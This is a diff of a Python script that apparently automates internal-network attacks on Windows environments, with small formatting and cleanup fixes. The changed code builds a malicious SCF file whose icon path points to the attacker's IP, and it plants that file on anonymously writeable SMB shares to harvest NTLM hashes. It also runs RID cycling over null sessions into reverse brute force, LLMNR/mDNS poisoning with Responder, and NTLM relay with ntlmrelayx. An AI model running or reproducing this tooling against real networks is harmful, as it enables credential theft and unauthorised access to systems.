@@ -98,7 +98,7 @@ def create_scf():
     scf_filename = '@local.scf'
 
     if not os.path.isfile(scf_filename):
-        scf_data = '[Shell]\n\nCommand=2\n\nIconFile=\\\\{}\\file.ico\n\n[Taskbar]\n\nCommand=ToggleDesktop'.format(get_ip())
+        scf_data = '[Shell]\r\nCommand=2\r\nIconFile=\\\\{}\\file.ico\r\n[Taskbar]\r\nCommand=ToggleDesktop'.format(get_ip())
         write_to_file(scf_filename, scf_data, 'w+')
 
     cwd = os.getcwd()+'/'
@@ -158,7 +158,7 @@ def parse_nse(hosts, args):
     smb_signing_disabled_hosts = []
 
     if 'scf' not in args.skip.lower():
-        print('[*] Attack 2: SCF file upload to anonymously writeable shares for hash collection')
+        print('\n[*] Attack 2: SCF file upload to anonymously writeable shares for hash collection')
 
 
     for host in hosts:
@@ -175,7 +175,7 @@ def parse_nse(hosts, args):
                 if script_out['id'] == 'smb-enum-shares':
                     lines = script_out['output'].splitlines()
                     write_scf_files(lines, ip, args)
-                    #local_scf_cleanup()
+                    local_scf_cleanup()
 
     if len(smb_signing_disabled_hosts) > 0:
         for host in smb_signing_disabled_hosts:
@@ -189,10 +189,15 @@ def local_scf_cleanup():
         os.remove('@local.scf')
     except:
         pass
+
     try:
         os.remove('smb-cmds.txt')
     except:
         pass
+
+    timestamp = str(time.time())
+    path = 'logs/shares-with-SCF.txt'
+    os.rename(path, path+'-'+timestamp)
 
 def get_hosts(args, report):
     '''
@@ -430,7 +435,7 @@ def smb_reverse_brute(loop, hosts, args):
     null_sess_hosts = {}
     dom_cmd = 'rpcclient -U "" {} -N -c "lsaquery"'
     dom_cmds = create_cmds(hosts, dom_cmd)
-    print('[*] Attack 1: RID cycling in null SMB sessions into reverse bruteforce')
+    print('\n[*] Attack 1: RID cycling in null SMB sessions into reverse bruteforce')
     print('[*] Checking for null SMB sessions')
     print('[*] Example command that will run: '+dom_cmds[0].split('&& ')[1])
     rpc_output = async_get_outputs(loop, dom_cmds)
@@ -843,7 +848,7 @@ def remote_scf_cleanup():
     '''
     Deletes the scf file from the remote shares
     '''
-    path = 'logs/Shares-with-SCF.txt'
+    path = 'logs/shares-with-SCF.txt'
     if os.path.isfile(path):
         with open(path) as f:
             lines = f.readlines()
@@ -881,7 +886,7 @@ def do_ntlmrelay(identifier, prev_hashes, prev_pwds, args):
     '''
     Continuously monitor and parse ntlmrelay output
     '''
-    print('[*] Attack 4: NTLM relay with Responder and ntlmrelayx')
+    print('\n[*] Attack 4: NTLM relay with Responder and ntlmrelayx')
     resp_proc, ntlmrelay_proc = run_relay_attack()
 
     ########## CTRL-C HANDLER ##############################
@@ -996,7 +1001,7 @@ def main(report, args):
     # ATTACK 3: LLMNR poisoning
     identifier = ''.join(random.choice(string.ascii_letters) for x in range(5))
     if 'llmnr' not in args.skip.lower():
-        print('[*] Attack 3: LLMNR/NBTS/mDNS poisoning for NTLM hashes')
+        print('\n[*] Attack 3: LLMNR/NBTS/mDNS poisoning for NTLM hashes')
         prev_lines = []
         resp_proc = start_responder_llmnr()
         time.sleep(2)
